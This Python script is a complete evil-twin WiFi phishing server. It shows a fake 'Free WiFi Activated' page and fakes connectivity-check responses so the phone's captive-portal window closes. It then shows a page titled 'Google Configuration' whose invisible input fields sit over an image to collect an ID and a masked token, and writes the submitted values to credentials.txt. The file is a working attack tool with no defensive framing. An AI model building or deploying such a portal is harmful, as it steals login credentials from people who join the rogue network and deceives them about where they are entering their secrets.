import socket
import urllib.parse
import datetime
import base64
import os

# CONFIG
HOST = '10.0.0.1'
PORT = 80
BG_PATH = '/home/itan/.gemini/antigravity/scratch/hardwifi/sc_portal/bg.png'

# GLOBAL STATE VARIABLE (Browser Escape)
# 0 = TRAP (Show portal in WebView)
# 1 = ESCAPE (Send 204 to close WebView and validate internet)
portal_state = 0

# --- IMAGE LOADING ---
b64_img = ""
if os.path.exists(BG_PATH):
    with open(BG_PATH, "rb") as f:
        b64_img = base64.b64encode(f.read()).decode('utf-8')

# --- VISUAL OMEGA v18.7 (FINAL PAYLOAD FOR CHROME) ---
visual_phish_html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google Configuration</title>
    <style>
        body {{ margin: 0; padding: 0; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }}
        .portal {{ 
            width: 380px; height: 500px; 
            background: url('data:image/png;base64,{b64_img}') no-repeat center; 
            background-size: contain; 
            position: relative; 
        }}
        input {{
            position: absolute;
            left: 55px; width: 270px; height: 45px;
            border: none; background: transparent;
            font-size: 16px; outline: none;
        }}
        #f1 {{ top: 236px; }}
        #f2 {{ top: 308px; -webkit-text-security: disc; }}
        .sub-btn {{
            position: absolute;
            right: 50px; bottom: 85px;
            width: 80px; height: 40px;
            background: transparent; border: none; cursor: pointer;
        }}
    </style>
</head>
<body>
    <div class="portal">
        <form action="/auth_submit" method="POST">
            <input type="text" id="f1" name="v_id" autocomplete="off" required>
            <input type="text" id="f2" name="v_tk" autocomplete="off" required>
            <button type="submit" class="sub-btn"></button>
        </form>
    </div>
</body>
</html>"""

# --- ESCAPE PAGE (Closes the captive portal app) ---
escape_html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Signal Detection...</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f0f2f5; }
        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; }
        .spinner { border: 4px solid rgba(0,0,0,0.1); border-left-color: #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <h2>Connecting...</h2>
        <div class="spinner"></div>
        <p>Please wait 5 seconds, the notification will disappear. Then open your browser and continue normally.</p>
    </div>
    <script>setTimeout(function(){ window.location.href="/trigger_success"; }, 2000);</script>
</body>
</html>"""

gate_html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free WiFi Access</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f0f2f5; }
        .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); display: inline-block; }
        .btn { background: #28a745; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Free WiFi Activated</h2>
        <p>To access unlimited navigation, click the button below.</p>
        <a href="/start_escape" class="btn">ACTIVATE NOW</a>
    </div>
</body>
</html>"""

headers_200 = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\nConnection: close\r\n\r\n"
headers_204 = "HTTP/1.1 204 No Content\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
headers_302 = "HTTP/1.1 302 Found\r\nLocation: http://10.0.0.1/\r\nConnection: close\r\n\r\n"

def main():
    global portal_state
    print(f"[*] ECLIPSE BEYOND v18.7 OPERATIONAL on {HOST}:80")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, 80))
        s.listen(100)
        while True:
            try:
                conn, addr = s.accept()
                with conn:
                    data = conn.recv(4096).decode('utf-8', errors='ignore')
                    if not data: continue
                    ts = datetime.datetime.now().strftime("%H:%M:%S")
                    req_line = data.split('\n')[0].strip()
                    with open('requests.log', 'a') as f:
                        f.write(f"[{ts}] {addr[0]} | STATE:{portal_state} | {req_line}\n")
                    
                    # --- STATE MANAGEMENT ---
                    
                    # ESCAPE LOGIC: If state is 1, always respond 204 to probes
                    if portal_state == 1 and ("generate_204" in req_line or "gen_204" in req_line):
                        conn.sendall(headers_204.encode('utf-8'))
                        continue

                    # TRIGGER: User clicks 'Activate Now'
                    if "/start_escape" in req_line:
                        conn.sendall((headers_200 + escape_html).encode('utf-8'))
                    
                    # COMMAND: Complete the escape
                    elif "/trigger_success" in req_line:
                        portal_state = 1
                        print("[!] ESCAPE ACTIVATED: Now pretending internet is working.")
                        conn.sendall(headers_204.encode('utf-8'))

                    # DATA CAPTURE (In real browser)
                    elif "/auth_submit" in data or "POST" in req_line:
                        body = data.split('\r\n\r\n')[-1]
                        parsed = urllib.parse.parse_qs(body)
                        v_id = parsed.get('v_id', [''])[0]; v_tk = parsed.get('v_tk', [''])[0]
                        if v_id or v_tk:
                            with open('credentials.txt', 'a') as f:
                                f.write(f"[{ts}] ID: {v_id} | TOKEN: {v_tk}\n")
                            print(f"[!!!] CREDENTIALS CAPTURED FROM REAL BROWSER: {v_id}")
                        conn.sendall((headers_200 + "<html><body><h1>Authorization Successful.</h1></body></html>").encode('utf-8'))

                    # INITIAL PROBES (Trap mode)
                    elif ("generate_204" in req_line or "gen_204" in req_line) and portal_state == 0:
                        conn.sendall(headers_302.encode('utf-8'))
                    
                    # HOME PAGE / CAPTURE IN CHROME
                    elif "GET / " in req_line or "10.0.0.1" in req_line or portal_state == 1:
                        # If in Escape Mode (1), serve phishing to any HTTP request in Chrome
                        conn.sendall((headers_200 + visual_phish_html).encode('utf-8'))
                    
                    else:
                        conn.sendall(headers_302.encode('utf-8'))
                        
            except Exception:
                pass

if __name__ == '__main__':
    main()
